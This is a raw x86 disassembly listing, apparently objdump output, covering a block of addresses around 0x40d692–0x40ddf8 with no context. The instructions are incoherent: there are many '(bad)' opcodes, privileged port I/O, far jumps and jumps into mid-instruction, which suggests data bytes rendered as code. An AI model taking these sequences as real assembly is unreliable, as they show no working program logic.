  40d692:	ins    BYTE PTR es:[edi],dx
  40d693:	in     al,0xea
  40d695:	das    
  40d696:	ret    
  40d697:	mov    al,0xc
  40d699:	add    BYTE PTR [eax-0x7],cl
  40d69c:	mov    ecx,0xc589af23
  40d6a1:	dec    ebx
  40d6a2:	outs   dx,DWORD PTR ds:[esi]
  40d6a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6a4:	jns    0x40d6d8
  40d6a6:	bound  esi,QWORD PTR [esi]
  40d6a8:	shr    BYTE PTR [ecx+0x7a],1
  40d6ab:	arpl   sp,sp
  40d6ad:	sahf   
  40d6ae:	in     eax,0x8a
  40d6b0:	push   es
  40d6b1:	mov    esi,0x9dd89800
  40d6b6:	in     al,0x59
  40d6b8:	mov    dl,0xd9
  40d6ba:	sbb    ebx,ebx
  40d6bc:	adc    BYTE PTR ds:[edx-0x180941fd],bh
  40d6c3:	aaa    
  40d6c4:	add    al,0xb7
  40d6c6:	push   ebx
  40d6c7:	add    DWORD PTR gs:[edi-0x5b5901f0],ecx
  40d6ce:	(bad)  
  40d6cf:	xchg   ecx,eax
  40d6d0:	xchg   ecx,eax
  40d6d1:	push   es
  40d6d2:	loopne 0x40d741
  40d6d4:	lods   al,BYTE PTR ds:[esi]
  40d6d5:	rcl    DWORD PTR [ebx+0x4b8e3e2],1
  40d6db:	pop    ebx
  40d6dc:	pop    ecx
  40d6dd:	cmp    BYTE PTR [esi+0x2],dl
  40d6e0:	gs pushf 
  40d6e2:	rol    ah,cl
  40d6e4:	mov    al,ds:0xed83a13b
  40d6e9:	dec    edi
  40d6ea:	jae    0x40d6e4
  40d6ec:	pop    edx
  40d6ed:	repnz and eax,0x6c78db8
  40d6f3:	lock push ebx
  40d6f5:	push   esp
  40d6f6:	pop    ecx
  40d6f7:	into   
  40d6f8:	sbb    eax,0x52aed03d
  40d6fd:	xor    dl,BYTE PTR [edi+0x430c0633]
  40d703:	mov    ds:0xabb3c893,al
  40d708:	(bad)  
  40d709:	or     dl,BYTE PTR [ecx-0x7e3a9e4c]
  40d70f:	sub    al,0x94
  40d711:	inc    eax
  40d712:	in     eax,dx
  40d713:	cs inc edx
  40d715:	pop    edx
  40d716:	xchg   DWORD PTR [ecx],esi
  40d718:	pop    esp
  40d719:	sahf   
  40d71a:	adc    BYTE PTR [eax],dh
  40d71c:	shl    dh,cl
  40d71e:	push   esp
  40d71f:	fldenv [esi]
  40d721:	nop
  40d722:	inc    ebx
  40d723:	ja     0x40d73f
  40d725:	cmp    edi,DWORD PTR [ebx]
  40d727:	ret    0x1c3c
  40d72a:	icebp  
  40d72b:	dec    eax
  40d72c:	xchg   ecx,eax
  40d72d:	mov    ah,0x1a
  40d72f:	jg     0x40d734
  40d731:	call   0xb23e:0x64bc8c70
  40d738:	mov    eax,ds:0xe19ebe73
  40d73d:	ss push ss
  40d73f:	ret    0x385e
  40d742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d744:	es aad 0xe2
  40d747:	pushf  
  40d748:	sbb    dh,BYTE PTR [edi+0x110bd2c5]
  40d74e:	repnz fist WORD PTR [edx+0x33fb2204]
  40d755:	jnp    0x40d6da
  40d757:	xor    eax,0x109456e
  40d75c:	xchg   DWORD PTR [eax],eax
  40d75e:	mov    al,BYTE PTR [ecx]
  40d760:	add    ebx,DWORD PTR [ebx-0x56c3b6e3]
  40d766:	xchg   edx,eax
  40d767:	mov    eax,0x431d5616
  40d76c:	xor    BYTE PTR [ebp+eiz*2-0x1d744ab],al
  40d773:	out    0xdb,eax
  40d775:	les    eax,FWORD PTR ds:0x222664d9
  40d77b:	adc    al,0x20
  40d77d:	mov    eax,0x3f694759
  40d782:	outs   dx,DWORD PTR ds:[esi]
  40d783:	sbb    dh,ch
  40d785:	aam    0xa
  40d787:	dec    esp
  40d788:	and    al,0xb8
  40d78a:	scas   eax,DWORD PTR es:[edi]
  40d78b:	in     al,dx
  40d78c:	(bad)  
  40d78d:	sbb    BYTE PTR [esi-0x1a8bde04],bh
  40d793:	pop    ds
  40d794:	popa   
  40d795:	mov    eax,0x6869b8db
  40d79a:	push   ebx
  40d79b:	mov    al,0x5
  40d79d:	adc    DWORD PTR [esi],0xfffffff9
  40d7a0:	xor    edx,0x419b8083
  40d7a6:	sbb    edi,DWORD PTR [edx]
  40d7a8:	(bad)  
  40d7aa:	sub    DWORD PTR [ecx-0x6a1c5ea7],0x3a7993d0
  40d7b4:	cdq    
  40d7b5:	pushf  
  40d7b6:	ror    DWORD PTR [esi+0x2c93fb60],cl
  40d7bc:	push   ecx
  40d7bd:	cs mov al,0xbb
  40d7c0:	hlt    
  40d7c1:	mov    bl,0x6f
  40d7c3:	mov    ecx,0xc00deea9
  40d7c8:	push   edi
  40d7c9:	or     al,0x40
  40d7cb:	std    
  40d7cc:	fs sub al,0xe3
  40d7cf:	mov    ds:0x3eaa71f0,eax
  40d7d4:	ins    DWORD PTR es:[edi],dx
  40d7d5:	jmp    0x40d7bc
  40d7d7:	jl     0x40d83d
  40d7d9:	es jg  0x40d818
  40d7dc:	mov    eax,ds:0x54f5b6f
  40d7e1:	ret    0x6063
  40d7e4:	jmp    0x951c:0xb2b7ca12
  40d7eb:	ins    DWORD PTR es:[edi],dx
  40d7ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ed:	pushf  
  40d7ee:	pop    edx
  40d7ef:	fmulp  st(0),st
  40d7f1:	jl     0x40d7f8
  40d7f3:	and    bl,dh
  40d7f5:	jp     0x40d85b
  40d7f7:	cdq    
  40d7f8:	(bad)  
  40d7f9:	xor    al,0x92
  40d7fb:	push   ecx
  40d7fc:	cmp    DWORD PTR [esp+esi*8+0xf],esi
  40d800:	shr    DWORD PTR [ecx+0x2de16286],0x9f
  40d807:	mov    eax,0x1df735e
  40d80c:	cmp    dl,bh
  40d80e:	cmp    eax,0xb64b215a
  40d813:	pop    ss
  40d814:	add    DWORD PTR [esi+0x407f70],edx
  40d81a:	adc    BYTE PTR [esi-0x37],ah
  40d81d:	nop
  40d81e:	pop    edi
  40d81f:	es sub ecx,eax
  40d822:	ret    0xd0ff
  40d825:	imul   edx,DWORD PTR [eax-0x5d],0xbe989726
  40d82c:	add    DWORD PTR ds:0x29bf9b2,esi
  40d832:	jb     0x40d86e
  40d834:	fs leave 
  40d836:	stos   BYTE PTR es:[edi],al
  40d837:	mov    ebx,esi
  40d839:	and    bh,dl
  40d83b:	fsubr  st(7),st
  40d83d:	outs   dx,DWORD PTR ds:[esi]
  40d83e:	jg     0x40d85b
  40d840:	push   0x4c
  40d842:	mov    ebx,0x683ffe0b
  40d847:	out    0x44,eax
  40d849:	add    al,0x69
  40d84b:	cdq    
  40d84c:	jmp    0x40d884
  40d84e:	dec    esi
  40d84f:	sub    ch,bh
  40d851:	stos   BYTE PTR es:[edi],al
  40d852:	nop
  40d853:	int    0xcc
  40d855:	pop    esp
  40d856:	inc    esi
  40d857:	jp     0x40d82e
  40d859:	jbe    0x40d817
  40d85b:	int    0xe
  40d85d:	fist   WORD PTR [ebx+0xdae359a]
  40d863:	shl    DWORD PTR [ecx+eax*4],0x46
  40d867:	jmp    0x40d7f0
  40d869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d86a:	fs or  al,0xd3
  40d86d:	fwait
  40d86e:	jp     0x40d849
  40d870:	xlat   BYTE PTR ds:[ebx]
  40d871:	in     eax,0x79
  40d873:	add    BYTE PTR [ebx+edx*8+0xe],bl
  40d877:	imul   esi,DWORD PTR [esi+edi*1],0xffffffe7
  40d87b:	mov    esi,0x4c6b0888
  40d880:	mov    dl,al
  40d882:	test   bh,bl
  40d884:	push   0xac9ad16a
  40d889:	push   esp
  40d88a:	dec    edi
  40d88b:	xor    eax,eax
  40d88d:	fcmovb st,st(0)
  40d88f:	xchg   edi,eax
  40d890:	data16 int 0xc0
  40d893:	cs jecxz 0x40d8c6
  40d896:	les    esi,FWORD PTR ds:0x55140f7a
  40d89c:	inc    esp
  40d89d:	mov    esp,0x4a74047c
  40d8a2:	imul   BYTE PTR [edx-0x26]
  40d8a5:	pop    ebp
  40d8a6:	mov    ds:0x87ebbfb6,eax
  40d8ab:	xchg   ebp,eax
  40d8ac:	cdq    
  40d8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ae:	in     al,dx
  40d8af:	rcr    DWORD PTR [eax],1
  40d8b1:	xchg   edx,eax
  40d8b2:	fdivr  st,st(4)
  40d8b4:	add    ch,ch
  40d8b6:	inc    edx
  40d8b7:	jno    0x40d90b
  40d8b9:	sahf   
  40d8ba:	aaa    
  40d8bb:	pop    esi
  40d8bc:	xor    ebp,eax
  40d8be:	pop    ds
  40d8bf:	test   eax,0x1bf236c
  40d8c4:	add    eax,0xcf176672
  40d8c9:	push   eax
  40d8ca:	or     al,0x54
  40d8cc:	and    DWORD PTR [ecx+ebx*8-0x7e],edi
  40d8d0:	into   
  40d8d1:	fidivr DWORD PTR [edi+edx*4-0x62]
  40d8d5:	cmovp  esi,DWORD PTR [eax]
  40d8d8:	into   
  40d8d9:	cmp    eax,0xa10a72d5
  40d8de:	add    DWORD PTR [eax-0x7e],ebx
  40d8e1:	jmp    0x40d93f
  40d8e3:	push   DWORD PTR [ebx-0x57]
  40d8e6:	xor    cl,BYTE PTR [ecx+ebx*4+0x4df31f5]
  40d8ed:	pop    ecx
  40d8ee:	fnstsw WORD PTR [eax+0x57a4f5da]
  40d8f4:	cmp    BYTE PTR [eax+0x160274b5],al
  40d8fa:	dec    eax
  40d8fb:	(bad)  
  40d8fd:	daa    
  40d8fe:	mov    cl,0xe5
  40d900:	pop    esi
  40d901:	mov    dh,0xd5
  40d903:	mul    BYTE PTR [ecx-0x23eef602]
  40d909:	pop    edx
  40d90a:	sbb    ebp,DWORD PTR [eax+0x7cb17cb0]
  40d910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d911:	and    al,0xb2
  40d913:	sbb    al,0x2a
  40d915:	push   ecx
  40d916:	aam    0xf9
  40d918:	sub    DWORD PTR [esi-0x4b],eax
  40d91b:	in     eax,dx
  40d91c:	dec    esp
  40d91d:	jecxz  0x40d971
  40d91f:	or     al,0xf5
  40d921:	cdq    
  40d922:	or     eax,0x8b73e36e
  40d927:	or     bl,BYTE PTR [ebp-0xa6d39a1]
  40d92d:	into   
  40d92e:	or     BYTE PTR [esi+esi*2+0x58],0xea
  40d933:	mov    bh,0x78
  40d935:	not    DWORD PTR [ecx]
  40d937:	stos   DWORD PTR es:[edi],eax
  40d938:	aas    
  40d939:	into   
  40d93a:	mov    bl,0x45
  40d93c:	jl     0x40d8c4
  40d93e:	dec    edi
  40d93f:	adc    edi,DWORD PTR [ebx-0x4ba5b28c]
  40d945:	mov    ds:0x28cbf28e,eax
  40d94a:	push   esi
  40d94b:	stos   BYTE PTR es:[edi],al
  40d94c:	sub    DWORD PTR [ecx+0x32],esp
  40d94f:	and    al,0xfa
  40d951:	mov    al,ds:0x9ed05d36
  40d956:	cmc    
  40d957:	sbb    al,0xa5
  40d959:	xchg   DWORD PTR [esi+esi*1-0x4b],ebx
  40d95d:	retf   0x6251
  40d960:	mov    al,0x4c
  40d962:	icebp  
  40d963:	pop    ebp
  40d964:	cld    
  40d965:	retf   
  40d966:	out    dx,eax
  40d967:	jmp    0x40d941
  40d969:	es mov dl,0x1d
  40d96c:	imul   edi,DWORD PTR [ebp+0x7a6f8a77],0xea7227a9
  40d976:	(bad)  
  40d977:	sub    cl,BYTE PTR [eax-0x460cac29]
  40d97d:	js     0x40d954
  40d97f:	ja     0x40d99c
  40d981:	in     eax,0xea
  40d983:	mov    dl,0xf
  40d985:	sti    
  40d986:	ret    
  40d987:	jo     0x40d911
  40d989:	(bad)  [eax]
  40d98b:	int    0x90
  40d98d:	ret    0xe908
  40d990:	xor    eax,0x834ae943
  40d995:	mov    esp,0xca99fa83
  40d99a:	fwait
  40d99b:	and    ah,BYTE PTR [edx]
  40d99d:	out    0x53,eax
  40d99f:	mov    esi,0xfdb27a44
  40d9a4:	sub    esi,DWORD PTR [ecx+0xa]
  40d9a7:	rcr    DWORD PTR [edi+0x79],0x8a
  40d9ab:	cmc    
  40d9ac:	xchg   edi,eax
  40d9ad:	(bad)  
  40d9ae:	cmp    bh,BYTE PTR [edi-0x130328e7]
  40d9b4:	adc    BYTE PTR [ebp+ecx*8-0x1b745c52],ah
  40d9bb:	leave  
  40d9bc:	loop   0x40d95d
  40d9be:	popf   
  40d9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9c0:	push   ebp
  40d9c1:	xor    al,0x8
  40d9c3:	jns    0x40d980
  40d9c5:	leave  
  40d9c6:	adc    BYTE PTR [ebx+0x7a],cl
  40d9c9:	out    0x46,eax
  40d9cb:	push   edx
  40d9cc:	adc    ah,BYTE PTR [ebp+0x5abff65e]
  40d9d2:	mov    dl,0x49
  40d9d4:	jo     0x40da26
  40d9d6:	sbb    DWORD PTR [eax+eiz*1-0x22],ebx
  40d9da:	loopne 0x40da45
  40d9dc:	sahf   
  40d9dd:	lock arpl WORD PTR [edi+edi*8+0x72],bp
  40d9e2:	shl    BYTE PTR [edi],1
  40d9e4:	pushf  
  40d9e5:	dec    eax
  40d9e6:	ja     0x40d998
  40d9e8:	add    al,bh
  40d9ea:	push   ebp
  40d9eb:	xchg   ecx,eax
  40d9ec:	(bad)  
  40d9ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ef:	add    eax,0x8e30c8bb
  40d9f4:	dec    edi
  40d9f5:	pop    ss
  40d9f6:	lods   al,BYTE PTR ds:[esi]
  40d9f7:	mov    esp,0x50c947b7
  40d9fc:	inc    edi
  40d9fd:	ins    DWORD PTR es:[edi],dx
  40d9fe:	xor    eax,0x6cf4252c
  40da03:	lods   eax,DWORD PTR ds:[esi]
  40da04:	data16 jecxz 0x40d9db
  40da07:	mov    bl,0xfe
  40da09:	push   ebp
  40da0a:	and    al,0x51
  40da0c:	std    
  40da0d:	or     ebx,DWORD PTR [ebx]
  40da0f:	push   0xdff0006e
  40da14:	push   ebx
  40da15:	or     al,0x8e
  40da17:	sub    BYTE PTR [esi+0x4f],ch
  40da1a:	and    cl,0xaa
  40da1d:	push   esi
  40da1e:	inc    eax
  40da1f:	test   DWORD PTR [ebp-0x2ca214d9],esp
  40da25:	aas    
  40da26:	sbb    ecx,DWORD PTR [edi]
  40da28:	inc    ebp
  40da29:	mov    al,ds:0x4b184232
  40da2e:	es (bad) 
  40da30:	jmp    0x63a00190
  40da35:	jo     0x40d9c4
  40da37:	and    al,0x74
  40da39:	call   0x5f9b:0xb8fd8174
  40da40:	adc    DWORD PTR [edi+0x3b],esi
  40da43:	jno    0x40dac3
  40da45:	sbb    BYTE PTR [esi-0x5d7a2d24],0x90
  40da4c:	mov    edx,eax
  40da4e:	sbb    BYTE PTR [edi+0x5a],dh
  40da51:	pop    esp
  40da52:	pop    es
  40da53:	jnp    0x40da5f
  40da55:	or     esp,DWORD PTR [ebx+ecx*4+0x10]
  40da59:	cmp    ebp,DWORD PTR [esi+0x79dd76c0]
  40da5f:	fdiv   DWORD PTR [ebx+0x5]
  40da62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da63:	push   ebp
  40da64:	mov    WORD PTR [ebx+0x41352bee],cs
  40da6a:	xchg   BYTE PTR [eax+0x3eca644f],bl
  40da70:	imul   esi,DWORD PTR [ecx-0x16a81059],0xffffffa0
  40da77:	cmp    edx,ebp
  40da79:	mov    ?,WORD PTR [edi-0x358bd137]
  40da7f:	sub    ebx,ecx
  40da81:	jecxz  0x40da44
  40da83:	setbe  BYTE PTR [ebx]
  40da86:	outs   dx,DWORD PTR ds:[esi]
  40da87:	xchg   BYTE PTR ds:0xb0e6ba07,dl
  40da8d:	dec    eax
  40da8e:	mov    al,0xeb
  40da90:	arpl   sp,si
  40da92:	popf   
  40da93:	test   DWORD PTR [edx+esi*4-0x2c],esp
  40da97:	cmc    
  40da98:	adc    ch,ah
  40da9a:	jne    0x40daa5
  40da9c:	jmp    0xd44bc69e
  40daa1:	sbb    eax,DWORD PTR [ebp-0x7bf2cca5]
  40daa7:	jg     0x40daa8
  40daa9:	or     DWORD PTR [esi+0x0],edx
  40daac:	clc    
  40daad:	(bad)  
  40daae:	sbb    eax,0x5d246ddf
  40dab3:	jb     0x40db11
  40dab5:	loope  0x40da91
  40dab7:	jecxz  0x40db15
  40dab9:	push   ecx
  40daba:	push   ss
  40dabb:	outs   dx,BYTE PTR ds:[esi]
  40dabc:	sbb    cl,bl
  40dabe:	jle    0x40daa8
  40dac0:	jecxz  0x40da6d
  40dac2:	fidiv  WORD PTR [ebx]
  40dac4:	ror    BYTE PTR [ebp-0x2e],1
  40dac7:	dec    edi
  40dac8:	fwait
  40dac9:	cmp    al,0xe7
  40dacb:	iret   
  40dacc:	mov    ds:0xb3c3db7b,al
  40dad1:	add    ecx,DWORD PTR [ecx+ebx*1-0x5aaf3761]
  40dad8:	hlt    
  40dad9:	imul   edi,DWORD PTR [esi+0x7df6d1ad],0xffffff93
  40dae0:	lods   al,BYTE PTR ds:[esi]
  40dae1:	sahf   
  40dae2:	sbb    BYTE PTR [eax],cl
  40dae4:	aas    
  40dae5:	push   ebx
  40dae6:	add    eax,0x6e8060b2
  40daeb:	or     DWORD PTR [edx-0x3],0xffffff81
  40daef:	into   
  40daf0:	jns    0x40db3b
  40daf2:	fcmovnbe st,st(4)
  40daf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf5:	outs   dx,BYTE PTR ds:[esi]
  40daf6:	fild   DWORD PTR [ebp-0x3f6eb945]
  40dafc:	loop   0x40db34
  40dafe:	repnz fsub QWORD PTR ds:[edi+esi*1-0x3c]
  40db04:	mov    BYTE PTR ds:0x29dc1871,cl
  40db0a:	pop    eax
  40db0b:	int    0x9e
  40db0d:	fdivr  QWORD PTR [edx]
  40db0f:	rcr    ebx,1
  40db11:	jb     0x40da9d
  40db13:	cmp    cl,al
  40db15:	lds    esp,FWORD PTR [ebx+0x2fc93434]
  40db1b:	imul   ebp,DWORD PTR [edx-0x75afb450],0xffffffd3
  40db22:	sub    eax,0xc66208f5
  40db27:	mov    edx,0xc4aaa0e5
  40db2c:	icebp  
  40db2d:	adc    BYTE PTR [esi],ch
  40db2f:	ins    BYTE PTR es:[edi],dx
  40db30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db31:	or     bl,BYTE PTR [eax+0x2b5e5af3]
  40db37:	clc    
  40db38:	adc    DWORD PTR [ecx+0x39],0x34c77fc4
  40db3f:	ret    
  40db40:	call   0x9b1718f
  40db45:	lea    edx,[ebp+0x22]
  40db48:	push   es
  40db49:	inc    esp
  40db4a:	or     ch,BYTE PTR ds:0x4ae93a72
  40db50:	jae    0x40db95
  40db52:	jne    0x40db61
  40db54:	jge    0x40dada
  40db56:	sbb    ebx,DWORD PTR [ebp-0x61f512a7]
  40db5c:	loop   0x40db04
  40db5e:	inc    eax
  40db5f:	or     DWORD PTR [ebp+0x26e52453],esp
  40db65:	imul   esi,eax,0xf0e0d92a
  40db6b:	mov    cl,0x1a
  40db6d:	jb     0x40dbba
  40db6f:	inc    esp
  40db70:	cmp    al,0xa0
  40db72:	jne    0x40dbea
  40db74:	xchg   edx,eax
  40db75:	ss pop ds
  40db77:	mov    edi,0x82663d1b
  40db7c:	(bad)  
  40db7d:	enter  0x672f,0xa1
  40db81:	dec    ecx
  40db82:	pop    ds
  40db83:	sbb    eax,0x109f47b0
  40db88:	push   edi
  40db89:	inc    eax
  40db8a:	je     0x40dbf0
  40db8c:	iret   
  40db8d:	arpl   WORD PTR [ebp+esi*1-0x3f],dx
  40db91:	fstp   QWORD PTR [eax-0x42fb77e2]
  40db97:	mov    ah,0x94
  40db99:	xor    dh,dh
  40db9b:	dec    esp
  40db9c:	adc    ebp,ebx
  40db9e:	in     eax,dx
  40db9f:	sub    DWORD PTR [ebp+0x5da19a99],edi
  40dba5:	aam    0xa9
  40dba7:	add    eax,0x1cf15a0a
  40dbac:	das    
  40dbad:	(bad)  
  40dbae:	push   ss
  40dbaf:	ss out 0xf4,al
  40dbb2:	sub    BYTE PTR es:[eax-0x9],cl
  40dbb6:	sub    BYTE PTR [eax],cl
  40dbb8:	(bad)  
  40dbb9:	repz xchg ebx,eax
  40dbbb:	adc    DWORD PTR [ecx-0x7e8f51c4],edx
  40dbc1:	mov    BYTE PTR [ebx-0x2c],0xec
  40dbc5:	push   0xffffff98
  40dbc7:	add    DWORD PTR [ecx+0xc],ebp
  40dbca:	and    esp,0xffffffe9
  40dbcd:	stos   BYTE PTR es:[edi],al
  40dbce:	cmp    eax,0xd8cde791
  40dbd3:	mov    eax,0xb2a059d2
  40dbd8:	lds    edi,FWORD PTR [ebp+0x3a258de6]
  40dbde:	ret    0x6349
  40dbe1:	in     al,0xda
  40dbe3:	fs and ch,0x96
  40dbe7:	lea    edx,[esi+0x5329665e]
  40dbed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbee:	ret    
  40dbef:	cmp    eax,0xd84922a4
  40dbf4:	lahf   
  40dbf5:	jb     0x40db9c
  40dbf7:	(bad)  [edx+0x12]
  40dbfa:	mov    fs,ecx
  40dbfc:	sub    esp,DWORD PTR [esi]
  40dbfe:	sbb    al,0x30
  40dc00:	jmp    0x52c:0x57d02bc0
  40dc07:	test   DWORD PTR [ecx+edx*2],ecx
  40dc0a:	popf   
  40dc0b:	inc    ecx
  40dc0c:	repz jecxz 0x40dc8d
  40dc0f:	sahf   
  40dc10:	into   
  40dc11:	cmp    eax,0x832f95df
  40dc16:	jne    0x40dbfb
  40dc18:	jo     0x40dbce
  40dc1a:	mov    esi,fs
  40dc1c:	xchg   ecx,eax
  40dc1d:	fwait
  40dc1e:	adc    esp,ebp
  40dc20:	cmp    al,0xfb
  40dc22:	jecxz  0x40dc5d
  40dc24:	or     DWORD PTR [edi],ecx
  40dc26:	or     cl,dh
  40dc28:	adc    ebp,DWORD PTR [ecx]
  40dc2a:	or     BYTE PTR [edx+edx*2+0x4b6f9035],ah
  40dc31:	push   cs
  40dc32:	cdq    
  40dc33:	in     al,dx
  40dc34:	dec    ebp
  40dc35:	outs   dx,BYTE PTR ds:[esi]
  40dc36:	jo     0x40dc86
  40dc38:	xchg   edx,eax
  40dc39:	push   ds
  40dc3a:	and    al,0xc1
  40dc3c:	cs jae 0x40dc31
  40dc3f:	jns    0x40dc43
  40dc41:	and    al,0x36
  40dc43:	dec    ebx
  40dc44:	(bad)  
  40dc46:	in     al,0x92
  40dc48:	scas   al,BYTE PTR es:[edi]
  40dc49:	or     al,0x31
  40dc4b:	ret    0xe7aa
  40dc4e:	nop
  40dc4f:	cmp    DWORD PTR [ecx],edi
  40dc51:	and    edx,esp
  40dc53:	or     eax,DWORD PTR [ecx]
  40dc55:	sub    BYTE PTR [edx-0x7b103622],bl
  40dc5b:	stos   BYTE PTR es:[edi],al
  40dc5c:	int3   
  40dc5d:	push   eax
  40dc5e:	inc    ecx
  40dc5f:	imul   DWORD PTR [edi+eax*2]
  40dc62:	mov    gs,ebp
  40dc64:	mov    WORD PTR ss:[ebp+0x25],cs
  40dc68:	repnz mov ?,WORD PTR [esi-0x7d02a90e]
  40dc6f:	or     edi,eax
  40dc71:	lds    ecx,FWORD PTR [esi]
  40dc73:	add    al,dl
  40dc75:	and    ah,BYTE PTR [ecx-0x6c1e3663]
  40dc7b:	push   ebx
  40dc7c:	call   0x941def3f
  40dc81:	dec    ebx
  40dc82:	pop    ebp
  40dc83:	xor    cl,cl
  40dc85:	in     al,dx
  40dc86:	daa    
  40dc87:	mov    edx,DWORD PTR [edi+0x5074e893]
  40dc8d:	stos   BYTE PTR es:[edi],al
  40dc8e:	xor    eax,DWORD PTR [ebp+0xc]
  40dc91:	mov    bl,BYTE PTR ds:0xb891d019
  40dc97:	popf   
  40dc98:	jmp    0x1578:0x8ea50b04
  40dc9f:	idiv   DWORD PTR [edi+0x59]
  40dca2:	(bad)  
  40dca3:	mov    edi,0xe6afae3
  40dca8:	inc    eax
  40dca9:	jl     0x40dcd9
  40dcab:	gs jbe 0x40dd1c
  40dcae:	mov    ds:0x4367fb32,al
  40dcb3:	sbb    ah,BYTE PTR [esi]
  40dcb5:	inc    eax
  40dcb6:	pop    ebp
  40dcb7:	jno    0x40dc5e
  40dcb9:	mov    ecx,0xf3dc99a6
  40dcbe:	stos   DWORD PTR es:[edi],eax
  40dcbf:	int3   
  40dcc0:	dec    ecx
  40dcc1:	sbb    eax,0x6571cf06
  40dcc6:	mov    ch,0x9f
  40dcc8:	sahf   
  40dcc9:	shr    DWORD PTR [esi+0x4b4fed5b],cl
  40dccf:	mov    cl,0x35
  40dcd1:	sbb    ebp,DWORD PTR [esi]
  40dcd3:	push   ds
  40dcd4:	test   dh,0xc
  40dcd7:	sbb    esi,DWORD PTR [ebx]
  40dcd9:	xchg   ebx,eax
  40dcda:	fcmovne st,st(6)
  40dcdc:	sbb    al,0x90
  40dcde:	dec    ecx
  40dcdf:	ins    BYTE PTR es:[edi],dx
  40dce0:	daa    
  40dce1:	jl     0x40dd4f
  40dce3:	cmp    BYTE PTR [ecx+0x7fd9bad2],al
  40dce9:	arpl   WORD PTR [edi+0xd1c7083],sp
  40dcef:	imul   esi,DWORD PTR [esi],0x7471ce41
  40dcf5:	cmc    
  40dcf6:	sub    DWORD PTR [edi-0x3ff8612e],ebx
  40dcfc:	jae    0x40dc96
  40dcfe:	and    eax,0x17b71856
  40dd03:	sti    
  40dd04:	repnz lahf 
  40dd06:	jae    0x40dd34
  40dd08:	jno    0x40dd4c
  40dd0a:	adc    ebx,0x95c30b3c
  40dd10:	clc    
  40dd11:	and    edi,DWORD PTR [eax+0x6b]
  40dd14:	ins    DWORD PTR es:[edi],dx
  40dd15:	inc    esp
  40dd16:	mov    ebx,0xf7f9f449
  40dd1b:	pop    esi
  40dd1c:	push   es
  40dd1d:	jl     0x40dd12
  40dd1f:	gs mov bl,0xd9
  40dd22:	mov    edi,0x92cd8e0e
  40dd27:	or     DWORD PTR [esi+0x17339083],esp
  40dd2d:	shl    dh,1
  40dd2f:	stos   BYTE PTR es:[edi],al
  40dd30:	test   al,0x6f
  40dd32:	clc    
  40dd33:	push   ebx
  40dd34:	xchg   edx,eax
  40dd35:	xchg   esi,eax
  40dd36:	jl     0x40dd58
  40dd38:	hlt    
  40dd39:	inc    ebp
  40dd3a:	add    al,0x4
  40dd3c:	pop    esi
  40dd3d:	xlat   BYTE PTR ds:[ebx]
  40dd3e:	lods   eax,DWORD PTR ds:[esi]
  40dd3f:	call   0xf28d:0x94594cc8
  40dd46:	mov    al,0xc0
  40dd48:	mov    bh,0x9a
  40dd4a:	jmp    0xb7aa82ca
  40dd4f:	test   BYTE PTR [edi-0x4d],bh
  40dd52:	ret    0x3fd7
  40dd55:	hlt    
  40dd56:	jp     0x40ddbf
  40dd58:	xor    DWORD PTR [edx-0xa],ebp
  40dd5b:	fwait
  40dd5c:	(bad)  
  40dd5d:	fidiv  WORD PTR [eax+0x62a690]
  40dd63:	pop    ebp
  40dd64:	out    0x11,eax
  40dd66:	sti    
  40dd67:	test   BYTE PTR [ebp+0x24edcf0],dl
  40dd6d:	mov    bl,0x42
  40dd6f:	mov    dl,BYTE PTR [ecx]
  40dd71:	cld    
  40dd72:	enter  0x364,0x21
  40dd76:	cmp    BYTE PTR [eax],ah
  40dd78:	int    0x62
  40dd7a:	sub    al,BYTE PTR ss:[ebx+0x162f66ad]
  40dd81:	jb     0x40ddcf
  40dd83:	(bad)  
  40dd84:	stc    
  40dd85:	inc    ebp
  40dd86:	popa   
  40dd87:	inc    edx
  40dd88:	imul   esi,esp,0x51d8be04
  40dd8e:	aaa    
  40dd8f:	jb     0x40ddc3
  40dd91:	inc    ebp
  40dd92:	sbb    eax,0xb80fdef4
  40dd97:	jge    0x40dd5d
  40dd99:	dec    edx
  40dd9a:	sbb    ch,BYTE PTR [ecx]
  40dd9c:	dec    esp
  40dd9d:	add    al,0x93
  40dd9f:	xor    DWORD PTR [ebx+0x3b],ebx
  40dda2:	call   0x8e146674
  40dda7:	mov    eax,ds:0x27845436
  40ddac:	or     al,BYTE PTR [edx+ebx*2+0x3c]
  40ddb0:	cmp    esp,DWORD PTR [esi]
  40ddb2:	push   ecx
  40ddb3:	(bad)  
  40ddb4:	bnd jle 0x40ddbb
  40ddb7:	or     DWORD PTR [ecx+0x7],edx
  40ddba:	(bad)  
  40ddbb:	sub    bh,cl
  40ddbd:	or     eax,0x4c7dff5
  40ddc2:	lods   al,BYTE PTR ds:[esi]
  40ddc3:	test   dh,0x14
  40ddc6:	cwde   
  40ddc7:	dec    ebx
  40ddc8:	out    0xc4,al
  40ddca:	pop    esi
  40ddcb:	loopne 0x40de0a
  40ddcd:	pop    edx
  40ddce:	mov    eax,0x3cb7b87e
  40ddd3:	mov    WORD PTR [eax-0x561fa26],es
  40ddd9:	fist   WORD PTR ds:0xb9276e5a
  40dddf:	pop    es
  40dde0:	lahf   
  40dde1:	add    ecx,DWORD PTR [esi+ebx*2-0x9]
  40dde5:	jbe    0x40de24
  40dde7:	inc    ebp
  40dde8:	push   ecx
  40dde9:	nop
  40ddea:	xchg   ebx,eax
  40ddeb:	pop    ecx
  40ddec:	mov    dh,0xdb
  40ddee:	outs   dx,BYTE PTR ds:[esi]
  40ddef:	inc    esp
  40ddf0:	add    al,0xbe
  40ddf2:	adc    eax,0x862c44b9
  40ddf7:	daa    
  40ddf8:	imul   edx
